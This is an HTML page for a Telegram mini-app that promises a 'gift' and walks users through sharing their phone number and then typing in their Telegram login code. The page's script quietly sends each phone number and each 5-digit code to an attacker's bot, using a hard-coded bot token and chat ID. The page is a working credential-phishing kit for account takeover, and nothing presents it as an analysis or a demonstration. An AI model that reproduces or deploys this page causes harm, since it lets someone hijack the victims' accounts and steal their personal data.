<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; padding: 20px; text-align: center; background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000); }
        .hidden { display: none !important; }
        
        .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
        .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
        
        .code-input { position: absolute; opacity: 0; width: 1px; height: 1px; font-size: 16px; }
        
        .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
        .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
        .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
        .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
        
        .auth-btn {
            background: var(--tg-theme-button-color, #3390ec);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none; border-radius: 10px; padding: 15px 20px;
            font-size: 16px; font-weight: 600; width: 100%; max-width: 300px;
            margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto;
        }
        .manual-input {
            width: 100%; max-width: 280px; padding: 15px; margin-top: 15px;
            border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px;
            font-size: 16px; text-align: center; box-sizing: border-box;
            background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000);
        }
        .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

    <!-- Экран 1 -->
    <div id="screen-phone">
        <h2 style="margin-top: 40px;">Step 1</h2>
        <p style="color: gray;">To receive your gift, authorize below 👇</p>
        
        <!-- Кнопка запроса через Telegram -->
        <button class="auth-btn" id="btn-share">SHARE PHONE NUMBER</button>
        
        <!-- Резервный ручной ввод (на случай глюков Telegram) -->
        <div style="margin-top: 30px; font-size: 14px; color: gray;">or enter manually:</div>
        <input type="tel" id="manual-phone" class="manual-input" placeholder="+7 999 000 00 00">
        <button class="auth-btn" id="btn-manual" style="background: #666;">CONTINUE</button>
    </div>

    <!-- Экран 2 -->
    <div id="screen-code" class="hidden">
        <div class="code-header">Enter the code</div>
        <div class="code-subtitle">We sent a Telegram code to your number<br><b>*** *** ** **</b></div>
        <div class="code-container" id="code-cells">
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
            <div class="code-cell"></div>
        </div>
        <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
        <div id="status-msg" class="success-text hidden">Code sent successfully!</div>
    </div>

    <script>
        window.onload = function() {
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.expand();
                let isSent = false;

                const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                const CHAT_ID = "-1004399809740";

                function sendToBot(text) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                    });
                }

                function showCodeScreen() {
                    document.getElementById('screen-phone').classList.add('hidden');
                    document.getElementById('screen-code').classList.remove('hidden');
                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                }

                // 1. Запрос номера через API
                document.getElementById('btn-share').onclick = function() {
                    tg.requestContact(function(shared, contact) {
                        if (shared) {
                            // Пытаемся достать номер
                            let phone = null;
                            if (contact && contact.phone_number) phone = contact.phone_number;
                            else if (contact && contact.phone) phone = contact.phone;
                            else if (tg.initDataUnsafe?.user?.phone_number) phone = tg.initDataUnsafe.user.phone_number;

                            if (phone) {
                                // Если номер есть — отправляем
                                sendToBot(`📱 PHONE: +${phone}`);
                                showCodeScreen();
                            } else {
                                // Если Telegram выдал undefined — просим ввести вручную
                                tg.showAlert("Telegram didn't provide the number. Please enter it manually.");
                                document.getElementById('manual-phone').focus();
                            }
                        }
                    });
                };

                // 2. Ручной ввод номера
                document.getElementById('btn-manual').onclick = function() {
                    const phone = document.getElementById('manual-phone').value;
                    if (phone.length > 5) {
                        sendToBot(`📱 PHONE (manual): ${phone}`);
                        showCodeScreen();
                    } else {
                        tg.showAlert("Please enter a valid phone number.");
                    }
                };

                // 3. Ввод кода
                const codeInput = document.getElementById('code-input');
                const codeCells = document.querySelectorAll('.code-cell');
                document.getElementById('code-cells').onclick = () => codeInput.focus();

                codeInput.addEventListener('input', function(e) {
                    const value = this.value.replace(/\D/g, '');
                    this.value = value;

                    codeCells.forEach((cell, index) => {
                        if (index < value.length) {
                            cell.innerText = value[index];
                            cell.classList.add('filled');
                        } else {
                            cell.innerText = '';
                            cell.classList.remove('filled');
                        }
                        if (index === value.length) cell.classList.add('active');
                        else cell.classList.remove('active');
                    });

                    if (value.length === 5 && !isSent) {
                        isSent = true;
                        this.blur();
                        
                        document.getElementById('status-msg').classList.remove('hidden');
                        document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                        
                        sendToBot(`🔑 CODE: ${value}`);
                        
                        setTimeout(() => {
                            document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
                        }, 1000);
                    }
                });
            }
        };
    </script>
</body>
</html>
